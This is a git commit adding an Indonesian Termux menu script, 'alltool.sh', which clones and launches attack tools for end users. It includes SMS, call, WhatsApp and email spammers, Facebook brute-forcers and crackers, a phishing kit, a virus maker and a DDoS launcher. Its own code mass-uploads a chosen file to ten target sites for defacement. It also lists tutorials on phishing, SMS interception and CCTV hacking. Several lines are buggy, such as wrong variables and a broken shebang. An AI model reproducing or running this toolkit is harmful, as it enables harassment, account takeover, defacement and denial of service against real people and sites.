fda49ad105439b228a5e3c3ae7710cc8cdf8b630
RED-MAFIA <99500367+Red-Mafia@users.noreply.github.com>
2022-02-25 16:09:28 +0500

    Create alltool.sh
    apt update
    
    apt upgrade
    
    apt install python
    
    apt install python2
    
    apt install git
    
    pip2 install requests
    
    pip2 install mechanize
    
    pip2 install bs4
    
    pip2 install futures
    
    git pull
    
    git clone https://github.com/Red-Mafia/alltool.git
    
    ls
    
    cd alltool
    
    bash alltool.sh

---
+++ alltool.sh
@@ -0,0 +1,644 @@
+#!bin/bash
+
+clear
+figlet Tools | lolcat
+echo "==============================================" | lolcat
+echo " [+] Author : RED-MAFIA              " | lolcat
+echo " [+] Github : Github.com/Red-Mafia" | lolcat
+echo " [+] Facebook : RED-MAFIA     " | lolcat
+echo "==============================================" | lolcat
+echo
+echo "        Menu Tools          " | lolcat
+echo "__________________________"
+echo
+echo "[1] Spam Sms" | lolcat
+echo "[2] Tampilan Termux" | lolcat
+echo "[3] Spam Call" | lolcat
+echo "[4] Spam Whatsapp" | lolcat
+echo "[5] Report FB" | lolcat
+echo "[6] Bot Reaction Facebook" | lolcat
+echo "[7] MBF" | lolcat
+echo "[8] Crack FB" | lolcat
+echo "[9] Cloning Yahoo" | lolcat
+echo "[10] Install Red_Hawk" | lolcat
+echo "[11] Install  Ubuntu" | lolcat
+echo "[12] Install Ngrok" | lolcat
+echo "[13] Install Kali Linux" | lolcat
+echo "[14] Install Metasploit" | lolcat
+echo "[15] Install CmsMap" | lolcat
+echo "[16] Install JoomScan" | lolcat
+echo "[17] Menstabilkan Jaringan" | lolcat
+echo "[18] Install Weeman" | lolcat
+echo "[19] Install IPGeoLocation" | lolcat
+echo "[20] Install Black-Hydra" | lolcat
+echo "[21] Kumpulan Tutorial Termux" | lolcat
+echo "[22] Chating Di Termux" | lolcat
+echo "[23] Install Hydra" | lolcat
+echo "[24] Mulung Bitcoin" | lolcat
+echo "[25] Browsing Di Termux" | lolcat
+echo "[26] Dengerin Lagu Youtube Di Termux" | lolcat
+echo "[27] Main Tebak-Tebakan" | lolcat
+echo "[28] Install BlackNmap" | lolcat
+echo "[29] Brute Deface webdav" | lolcat
+echo "[30] Install Tools Surat Cinta" | lolcat
+echo "[31] AutoLike Facebook" | lolcat
+echo "[32] Bot Komentar Facebook" | lolcat
+echo "[33] Virus VbugMaker Creator" | lolcat
+echo "[34] Install Linux Fedora" | lolcat
+echo "[35] Install Honeypot" | lolcat
+echo "[36] Spam Akun Gmail" | lolcat
+echo "[37] Install SqlScan" | lolcat
+echo "[38] Install Hash-Buster" | lolcat
+echo "[39] Install LITEDDOS buat DDOS website" | lolcat
+echo "[40] Install Binggo" | lolcat
+echo "[41] Install Tools Gado-Gado" | lolcat
+echo "[42] Install LITESCRIPT" | lolcat
+echo "[43] Install Instagram Bot" | lolcat
+echo "[44] Install Faceboook Brute" | lolcat
+echo "[45] Script Marshall (Biar Gk Di Record Orang²)" | lolcat
+echo "[0] Exit" | lolcat
+echo "__________________________________________" | lolcat
+echo
+read -p "Masukan Pilihan: "  Ery
+echo "Pilih Yang benar" | lolcat
+if [ $Ery = 1 ]
+then
+clear
+figlet "ERI" | lolcat
+git clone https://github.com/Eri-bit/sms
+sleep 1
+cd sms
+python ESC.py
+fi
+ if [ $Ery = 2 ]
+then
+clear
+figlet "ERI" | lolcat
+apt install python2 -y
+apt install git -y
+sleep 1
+git clone https://github.com/4NK3R-PRODUCT1ON/T4MPILAN-V5
+cd T4MPILAN-V5
+python2 style5.py
+fi
+
+ if [ $Ery = 3 ]
+then
+clear
+figlet "ERI" | lolcat
+git clone https://github.com/404rgr/spamerCALL
+sleep 1
+cd spamerCALL
+python spamercall.py
+fi
+ if [ $Ery = 4 ]
+then
+clear
+figlet "ERI" | lolcat
+git clone https://github.com/Sxp-ID/spam-wa
+sleep 1
+cd spam-wa
+pip install -r requirements.txt
+python wa.py
+fi
+ if [ $Ery = 5 ]
+then
+clear
+figlet "ERI" | lolcat
+git clone https://github.com/IlayTamvan/Report.git
+sleep 1
+cd Report
+unzip Report.zip
+python2 Report.py
+fi
+ if [ $Ery = 6 ]
+then
+clear
+figlet "ERI" | lolcat
+git clone https://github.com/edi-nasa12/ROBOT.git
+sleep 1
+cd ROBOT
+python2 blackbot.py
+fi
+ if [ $Ery = 7 ]
+then
+clear
+figlet "ERI" | lolcat
+git clone https://github.com/tikuskecil/multi-bruteforce-facebook.git
+sleep 1
+cd multi-bruteforce-facebook
+python2 MBF.py
+fi
+ if [ $Ery = 8 ]
+then
+clear
+figlet "ERI" | lolcat
+git clone https://github.com/Dapunta/elite
+sleep 1
+cd elite
+git pull
+python elite.py
+fi
+ if [ $Ery = 9 ]
+then
+clear
+figlet "ERI" | lolcat
+git clone https://github.com/wahyuandhika/YahooCloning.git
+sleep 1
+cd YahooCloning
+pip2 install requests mechanize
+pip2 install requirements
+python2 cloning.py
+fi
+ if [ $Ery = 10 ]
+then
+clear
+figlet "ERI" | lolcat
+apt update
+apt install git
+apt install php
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+mv RED_HAWK $HOME
+cd $HOME/RED_HAWK
+chmod +x rhawk.php
+php rhawk.php
+fi
+ if [ $Ery = 11 ]
+then
+clear
+figlet "ERI" | lolcat
+apt update && apt upgrade
+apt install git
+apt install wget
+apt install proot
+git clone https://github.com/Neo-Oli/termux-ubuntu.git
+mv termux-ubuntu $HOME
+cd $HOME/~/termux-ubuntu
+chmod +x ubuntu.sh
+sh ubuntu.sh
+fi
+ if [ $Ery = 12 ]
+then
+clear
+figlet "ERI" | lolcat
+apt update && apt upgrade
+apt install wget
+mkdir ngrok
+cd ~/ngrok
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
+mv ngrok-stable-linux-arm.zip $HOME
+$HOME/unzip ngrok-stable-linux-arm.zip
+cd ~/
+ls
+fi
+ if [ $Ery = 13 ]
+then
+clear
+figlet "ERI" | lolcat
+apt update
+apt upgrade
+apt install git
+git clone https://github.com/Hax4us/Nethunter-In-Termux.git
+mv Nethunter-In-Termux $HOME
+cd $HOME/Nethunter-In-Termux
+chmod 777 kalinethunter
+sh kalinethunter
+fi
+ if [ $Ery = 14 ]
+then
+clear
+figlet "ERI" | lolcat
+pkg install curl
+curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
+chmod +x metasploit.sh
+./metasploit.sh
+mv metasploit-framework $HOME
+cd $HOME/metasploit-framework
+./msfconsole
+fi
+ if [ $Ery = 15 ]
+then
+clear
+figlet "ERI" | lolcat
+apt-get update
+apt-get upgrade
+pkg install python
+apt-get install git
+git clone https://github.com/Dionach/CMSmap.git
+mv CMSmap $HOME
+cd $HOME/CMSmap
+ls
+fi
+ if [ $Ery = 16 ]
+then
+clear
+figlet "ERI" | lolcat
+apt update
+apt upgrade
+apt install git
+apt install perl
+git clone https://github.com/rezasp/joomscan.git
+mv joomscan $HOME
+cd $HOME/joomscan
+ls
+fi
+ if [ $Ery = 17 ]
+then
+clear
+figlet "ERI" | lolcat
+sleep 1
+echo "===============Menstabilkan Jaringan========="
+sleep 1
+echo "==================By ERI=================="
+sleep 1
+echo ""
+echo ""
+ping -D 8.8.8.8
+fi
+ if [ $Ery = 18 ]
+then
+clear
+figlet "ERI" | lolcat
+apt install git
+apt install php
+git clone https://github.com/evait-security/weeman.git
+mv weeman $HOME
+cd $HOME/weeman
+python2 weeman.py
+fi
+ if [ $Ery = 19 ]
+then
+clear
+figlet "ERI" | lolcat
+apt install git
+apt install python
+apt install python2
+git clone https://github.com/maldevel/IPGeoLocation.git
+mv IPGeoLocation $HOME
+cd $HOME/IPGeoLocation
+chmod +x ipgeoLocation.py
+pip install -r requirements.txt
+python ipgeolocation.py -m
+read -p "[Masukan IP/website]>" target
+python ipgeolocation.py -t target
+fi
+ if [ $Ery = 20 ]
+then
+clear
+figlet "ERI" | lolcat
+apt update && apt upgrade
+apt install git
+apt install python
+apt install python2
+git clone https://github.com/Gameye98/Black-Hydra.git
+mv Black-Hydra $HOME
+cd $HOME/Black-Hydra
+python2 blackhydra.py
+fi
+ if [ $Ery = 21 ]
+then
+clear
+figlet "ERI"
+echo "Cara Hack Facebook Di Termux:" " https://youtu.be/FsI4pCapfLY"
+
+echo "Cara Hack ML & COC:" "https://youtu.be/qJc1KaD3QcQ"
+
+echo "Cara Phising Di Termux:" "https://youtu.be/LU0QMstAI88"
+
+echo "Cara Membuat Virus Seperti Asli:" "https://youtu.be/efIhyTJiR00"
+
+echo "Cara Pindah Ke Shell Fish:" "https://youtu.be/cEBsXHkOco0"
+
+echo "Cara Sadap SMS Di Termux:" "https://youtu.be/jQlZg6afZ-Y"
+
+echo "Belajar Bahasa Pemrograman Bash:" "https://youtu.be/66lkSQ3ZEvE"
+
+echo "Belajar Bahasa Pemrograman Bash 2:" "https://youtu.be/Gy1J_aMquPY"
+
+echo "Cara Sadap HP Di Termux:" "https://youtu.be/n9mlAWTLMXQ"
+
+echo "Cara Browsingan Di Termux:" "https://youtu.be/3sGnqhiwpDM"
+
+echo "Cara Chatingan Di Termux:" "https://youtu.be/Us11rFsJb7A"
+
+echo "Cara Hack CCTV Di Termux:" "https://youtu.be/WliwxqNfefc"
+
+echo "Cara Install Ngrok Di Termux:" "https://youtu.be/ec0M1Rpoh6I"
+
+echo "Cara Mempercantik Termux:" "\033[36;1mhttps://youtu.be/CpQBfiffAjw"
+
+echo "Cara Mencari Admin Login Di Termux:" "https://youtu.be/mLAt3jsOn18"
+
+echo "Cara Membuat Cowsay Sendiri:" "https://youtu.be/PleMF82Mcgs"
+
+echo "Cara Menyalakan Musik Di Termux:" "https://youtu.be/lo8wqVOjbVw"
+
+echo "Cara Encrypt Tools Python Di Termux:" "https://youtu.be/-HyU7NZVDd8"
+
+echo "Cara Update Status Di Termux:" "https://youtu.be/l9G3QHf6w5s"
+
+echo "Cara Cek Link DeepWeb Di Termux:" "https://youtu.be/8-zFNfMG-Ho"
+
+echo "Cara Menampilkan Animasi Di Termux:" "https://youtu.be/FJF-PIwa0sI"
+
+echo "Cara Menggunakan A-Rat Di Termux:" "https://youtu.be/tx7ykJrqULQ"
+
+echo "Install Spammer Grab Terbaru:" "https://youtu.be/z5qVr--gCM8"
+
+echo "Cara Scan Situs Di Termux:" "https://youtu.be/h2I5HU3W-so"
+
+echo "Cara DDOS Di Termux:" "https://youtu.be/EskgepQSB7U"
+fi
+ if [ $Ery = 22 ]
+then
+clear
+figlet "ERI" | lolcat
+pkg install irssi
+irssi
+fi
+ if [ $Ery = 23 ]
+then
+clear
+figlet "ERI" | lolcat
+pkg install python2
+pkg install python
+pkg install php
+pkg install hydra
+fi
+ if [ $Ery = 24 ]
+then
+clear
+figlet "ERI" | lolcat
+pkg install python
+pkg install git
+pkg install php
+git clone https://github.com/Cvar1984/pemulungBTC.git
+mv pemulungBTC $HOME
+cd $HOME/pemulungBTC
+php autoload.php
+php mulung.php
+fi
+ if [ $Ery = 25 ]
+then
+clear
+figlet "ERI" | lolcat
+sleep 1
+pkg install w3m
+w3m www.google.com
+fi
+ if [ $Ery = 26 ]
+then
+clear
+figlet "ERI" | lolcat
+sleep 1
+apt update && apt upgrade
+apt install pip
+pkg install python
+pkg install python2
+pip install mps_youtube
+pip install youtube_dl
+pkg install mpv
+mpsyt
+fi
+ if [ $Ery = 27 ]
+then
+clear
+figlet "ERI" | lolcat
+sleep 1
+cd module
+python2 cinta.py
+fi
+ if [ $Ery = 28 ]
+then
+clear
+figlet "ERI" | lolcat
+sleep 1
+apt update
+apt upgrade
+apt install git
+git clone https://github.com/Xi4u7/BlackNmap
+mv BlackNmap $HOME
+cd $HOME/BlackNmap
+chmod 777 blacknmap
+./blacknmap
+fi
+ if [ $Ery = 29 ]
+then
+clear
+figlet "ERI" | lolcat
+echo "Author : ERI" | lolcat
+echo "Github : Github.com/Eri-bit" | lolcat
+echo "Facebook : Eri Kdr " | lolcat
+echo "Masukan nama script"
+read -p "[=======>" script
+echo "Masukan Web Target Ke1"
+read -p "[=======>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+echo  "Masukan Web Target Ke2 "
+read -p "[=======>" Ke2
+curl -T /storage/emulated/0/$script $Ke2
+echo  "Masukan Web Target Ke3"
+read -p "[=======>" Ke3
+curl -T /storage/emulated/0/$script $Ke3
+echo  "Masukan Web Target Ke4"
+read -p "[=======>" Ke4
+curl -T /storage/emulated/0/$script $Ke5
+echo  "Masukan Web Target Ke5"
+read -p "[=======>" Ke5
+curl -T /storage/emulated/0/$script $Ke5
+echo  "Masukan Web Target Ke6"
+read -p "[=======>" Ke6
+curl -T /storage/emulated/0/$script $Ke6
+echo  "Masukan Web Target Ke7"
+read -p "[=======>" Ke7
+curl -T /storage/emulated/0/$script $Ke7
+echo  "Masukan Web Target Ke8"
+read -p "[=======>" Ke8
+curl -T /storage/emulated/0/$script $Ke8
+echo  "Masukan Web Target Ke9"
+read -p "[=======>" Ke9
+curl -T /storage/emulated/0/$script $Ke9
+echo  "Masukan Web Target Ke10"
+read -p "[=======>" Ke10
+curl -T /storage/emulated/0/$script $Ke10
+sleep 1
+echo "[<=====================SEDANG PROSES=====================>]"
+echo "Silahkan Cek Web $Ke1/$script"
+echo "Silahkan Cek Web $Ke2/$script"
+echo "Silahkan Cek Web $Ke3/$script"
+echo "Silahkan Cek Web $Ke4/$script"
+echo "Silahkan Cek Web $Ke5/$script"
+echo "Silahkan Cek Web $Ke6/$script"
+echo "Silahkan Cek Web $Ke7/$script"
+echo "Silahkan Cek Web $Ke8/$script"
+echo "Silahkan Cek Web $Ke9/$script"
+echo "Silahkan Cek Web $Ke10/$script"
+echo "[=============HAPPY DEFACE=============]"
+fi
+ if [ $Ery = 30 ]
+then
+clear
+figlet "ERI" | lolcat
+sleep 1
+apt update
+apt upgrade
+apt install git
+git clone https://github.com/aryanrtm/suRAT-cinta
+mv suRAT-cinta $HOME
+cd $HOME/suRAT-cinta
+sh suRAT.sh
+fi
+ if [ $Sry = 31 ]
+then
+clear
+figlet "ERI" | lolcat
+sleep 1
+php autolike.php
+fi
+ if [ $Ery = 32 ]
+then
+clear
+figlet "ERI" | lolcat
+sleep 1
+python2 botkomen.py
+fi
+ if [ $Ery = 33 ]
+then
+clear
+figlet "ERI" | lolcat
+sleep 1
+python2 anvima.py
+fi
+ if [ $Ery = 34 ]
+then
+clear
+figlet "ERI" | lolcat
+sleep 1
+apt update && apt upgrade
+apt-get install git
+apt install wget
+git clone https://github.com/nmilosev/termux-fedora.git
+mv termux-fedora $HOME
+cd $HOME/termux-fedora
+chmod +x termux-fedora.sh
+sh termux-fedora.sh
+fi
+ if [ $Ery = 35 ]
+then
+clear
+figlet "ERI" | lolcat
+sleep 1
+apt update
+apt upgrade
+apt install git
+apt install php
+git clone https://github.com/whackashoe/php-spam-mail-honeypot.git
+mv php-spam-mail-honeypot $HOME
+cd $HOME/php-spam-mail-honeypot
+php honeypot.php
+fi
+ if [ $Ery = 36 ]
+then
+clear
+figlet "ERI" | lolcat
+python2 SpamMail.py
+fi
+ if [ $Ery = 37 ]
+then
+clear
+figlet "ERI" | lolcat
+pkg install update && pkg install upgrade
+pkg install git
+pkg install php
+cd module
+php sqlscan.php
+fi
+ if [ $Ery = 38 ]
+then
+clear
+figlet "ERI" | lolcat
+apt upgrade
+apt install python2
+apt install git
+git clone https://github.com/UltimateHackers/Hash-Buster
+mv Hash-Buster $HOME
+cd $HOME/Hash-Buster
+python2 hash.py
+fi
+ if [ $Ery = 39 ]
+then
+clear
+figlet "ERI" | lolcat
+sleep 3
+apt update
+apt install git
+git clone https://github.com/4L13199/LITEDDOS
+mv LITEDDOS $HOME
+cd $HOME/LITEDDOS
+read -p "MasukanTarget:" target
+python2 LITEDDOS.py target 80 100
+fi
+ if [ $Ery = 40 ]
+then
+clear
+figlet "ERI" | lolcat
+git clone https://github.com/Hood3dRob1n/BinGoo
+mv BinGoo $HOME
+cd $HOME/BinGoo
+bash bingoo
+fi
+ if [ $Ery = 41 ]
+then
+clear
+figlet "ERI" | lolcat
+apt  update && apt upgrade
+apt install ruby
+apt install lolcat
+apt install git
+git clone https://github.com/Senitopeng/GadoGado.git
+mv GadoGado $HOME
+cd $HOME/GadoGado
+bash gado
+fi
+ if [ $Ery = 42 ]
+then
+clear
+figlet "ERI"  | lolcat
+apt update 
+apt upgrade
+apt install git
+apt install perl
+git clone https://github.com/4L13199/LITESCRIPT
+mv LITESCRIPT $HOME
+cd $HOME/LITESCRIPT
+python2 LITESCRIPT.py
+fi
+ if [ $Ery = 43 ]
+then
+clear
+figlet "ERI" | lolcat
+git clone https://github.com/mpawlak2/instalike-instagram-bot.git
+cd instalike-instagram-bot.git
+pip3 install -U requests --user
+pkg install python3
+python3 main.py
+fi
+ if [ $Ery = 44 ]
+then
+clear
+figlet "ERI" | lolcat
+git clone https://github.com/IAmBlackHacker/Facebook-BruteForce
+cd Facebook-BruteForce
+python3 -m pip install requests bs4
+python3 -m pip install mechanize
+python3 fb.py or python fb2.py
+fi
+ if [ $Ery = 45 ]
+then
+clear
+figlet "ERI" | lolcat
+git clone https://github.com/DARK-02/dark_marshall
+cd dark_marshall
+ls
+python2 dark_marshall.py
+fi
